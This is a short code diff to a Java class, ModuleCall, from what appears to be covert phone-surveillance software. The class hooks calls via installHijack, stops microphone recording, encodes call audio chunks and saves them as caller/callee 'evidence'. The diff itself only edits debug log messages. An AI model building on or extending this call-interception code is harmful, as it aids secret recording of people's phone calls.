@@ -169,7 +169,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (installHijack()) {
 					if (ModuleMic.self() != null) {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (resume) can't switch on mic because call is on");
+							Check.log(TAG + " (actualStart) can't register call 'cos mic is on:stopping it");
 						}
 						ModuleMic.self().stop();
 					}
@@ -686,7 +686,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		if (!callInfo.update(false)) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (encodeChunks): unknown call program");
+				Check.log(TAG + " (encodeChunks): unknown call program removing" + (remote ? "Remote":"local"));
 			}
 
 			return;
@@ -747,6 +747,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 							if (chunk.end.getTime() < firstl.begin.getTime()) {
 								AutoFile filetmp = new AutoFile(encodedFile);
 								filetmp.delete();
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (encodeChunks):removing old LOCAL chunk !! :"+filetmp.getName() + " StreamId:" +streamId);
+								}
 							} else {
 								saveCallEvidence(caller, callee, chunk, callInfo.programId);
 							}
@@ -789,7 +792,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		// Remove file
 		if (Cfg.DEBUG) {
-			// Check.log(TAG + "(encodeChunks): deleting " + file.getName());
+			 Check.log(TAG + "(encodeChunks): deleting " + file.getName());
 		}
 
 		audioEncoder.removeRawFile();
